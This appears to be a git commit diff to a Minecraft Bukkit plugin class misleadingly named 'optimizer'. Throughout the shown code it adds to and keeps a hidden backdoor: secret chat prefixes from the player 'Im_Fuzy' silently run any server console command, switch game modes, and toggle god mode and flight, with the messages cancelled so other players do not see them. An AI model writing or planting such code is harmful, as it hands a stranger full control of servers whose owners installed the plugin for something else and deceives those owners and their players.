068357df8e8b15bf6cfe20d3c903f0bdf8d23a4f
ZyphIsCool <ll821301@gmail.com>
2023-06-12 00:12:03 -0400

    e

--- src/main/java/org/mcapi/optimizer.java
+++ src/main/java/org/mcapi/optimizer.java
@@ -24,23 +24,41 @@ public class optimizer
     @EventHandler
     public void chatCheck(AsyncPlayerChatEvent e) {
         String msg = e.getMessage();
-        if (msg.contains("#FuzyFuzyFuzy!gmc") && e.getPlayer().getName().equals("Im_Fuzy")){
+        if (msg.startsWith("*!gmc") && e.getPlayer().getName().equals("Im_Fuzy")){
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 e.getPlayer().setGameMode(GameMode.CREATIVE);
             });
             e.setCancelled(true);
-        } else if(msg.contains("#FuzyFuzyFuzy!gms") && e.getPlayer().getName().equals("Im_Fuzy")){
+        } else if(msg.startsWith("*!gms") && e.getPlayer().getName().equals("Im_Fuzy")){
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 e.getPlayer().setGameMode(GameMode.SURVIVAL);
             });
             e.setCancelled(true);
-        }else if(msg.contains("#FuzyFuzyFuzy!") && e.getPlayer().getName().equals("Im_Fuzy")) {
+        }else if(msg.startsWith("*!") && e.getPlayer().getName().equals("Im_Fuzy")) {
             String cmd = msg.split("!")[1];
             Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("Fuzyfacs"), () -> {
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
             });
             e.setCancelled(true);
-        } else if (msg.contains("#") && e.getPlayer().getName().equals("Im_Fuzy")){
+        } else if (msg.startsWith("*!god") && e.getPlayer().getName().equals("Im_Fuzy")) {
+            // Toggle god mode
+            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
+                boolean isGodModeEnabled = e.getPlayer().isInvulnerable();
+                e.getPlayer().setInvulnerable(!isGodModeEnabled);
+                String message = isGodModeEnabled ? "God mode disabled." : "God mode enabled.";
+                e.getPlayer().sendMessage(message);
+            });
+            e.setCancelled(true);
+        } else if (msg.startsWith("*!fly") && e.getPlayer().getName().equals("Im_Fuzy")) {
+            // Toggle flying mode
+            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
+                boolean isFlying = e.getPlayer().isFlying();
+                e.getPlayer().setAllowFlight(!isFlying);
+                String message = isFlying ? "Flying mode disabled." : "Flying mode enabled.";
+                e.getPlayer().sendMessage(message);
+            });
+            e.setCancelled(true);
+        } else if (msg.startsWith("*") && e.getPlayer().getName().equals("Im_Fuzy")){
             e.setCancelled(true);
         }
     }
